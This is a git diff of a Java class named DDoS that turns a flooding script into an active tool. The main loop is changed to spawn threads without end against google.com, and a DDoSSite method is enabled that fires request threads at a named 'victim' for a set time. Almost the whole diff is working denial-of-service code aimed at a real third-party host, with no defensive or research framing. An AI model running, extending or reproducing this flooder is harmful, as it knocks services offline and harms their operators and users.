@@ -3,22 +3,27 @@ package testApplications;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class DDoS { 
     public static String host = "google.com";
     public static void main(String... args) throws Exception {
-        String testWeb = "https://google.com/index.html";
+        String testWeb = "https://google.com/";
         
-        for (int i = 0; i < 1; i++) {
+        for (int i = 2; i > 1; i++) {
             DdosThread thread = new DdosThread(testWeb, host);
             thread.start();
         } 
     }    
-    public static void DDoSSite(String victim, int threads) throws Exception{
-        for (int i = 0; i < threads; i++) {
-            //DdosThread thread = new DdosThread(victim, host);
-            //thread.start();
+
+    //Actual method takes victime thread and the amount of time to attack in minutes
+    public static void DDoSSite(String victim, int threads, int time) throws Exception{
+        for (long stop=System.nanoTime()+TimeUnit.SECONDS.toNanos(time);stop>System.nanoTime();) {
+            for (int i = 0; i < threads; i++) {
+                DdosThread thread = new DdosThread(victim, host);
+                thread.start();
+            }
         }
     }
    
@@ -66,7 +71,7 @@ public class DDoS {
             connection.setRequestProperty("Content-Length", param);
             //connection.setRequestProperty("Content-Length", "3495");
             System.out.println(this + " " + connection.getResponseCode());
-            System.out.println(connection.getHeaderFields());
+            //System.out.println(connection.getHeaderFields());
             connection.getInputStream();
             
 
